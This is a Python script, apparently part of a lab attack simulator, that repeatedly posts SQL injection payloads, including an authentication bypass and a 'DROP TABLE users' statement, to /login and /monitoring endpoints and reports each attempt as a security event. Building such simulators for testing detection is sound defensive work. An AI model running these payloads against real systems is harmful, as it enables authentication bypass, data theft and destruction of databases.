import requests
import time
import logging
import os
import sys
sys.path.append('/attack/common')
from event_sender import send_security_event

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TARGET_HOST = os.getenv('TARGET_HOST', 'target_proxy')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

ENDPOINTS = ["/login", "/monitoring"]
PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT * FROM users--",
]

def perform_sqli_attack():
    while True:
        for endpoint in ENDPOINTS:
            for payload in PAYLOADS:
                try:
                    data = {"username": payload, "password": payload}
                    response = requests.post(f"{TARGET_URL}{endpoint}", data=data)
                    logger.info(f"SQL Injection attempt on {endpoint} with payload {payload}: {response.status_code}")
                    
                    # Отправляем событие безопасности
                    send_security_event('SQLi', response.request.headers.get('X-Real-IP', 'unknown'),
                                     f"Endpoint: {endpoint}, Payload: {payload}")
                    
                except Exception as e:
                    logger.error(f"Error during SQL injection attack: {e}")
                time.sleep(1)

if __name__ == "__main__":
    logger.info("Starting SQL Injection attacks...")
    perform_sqli_attack() 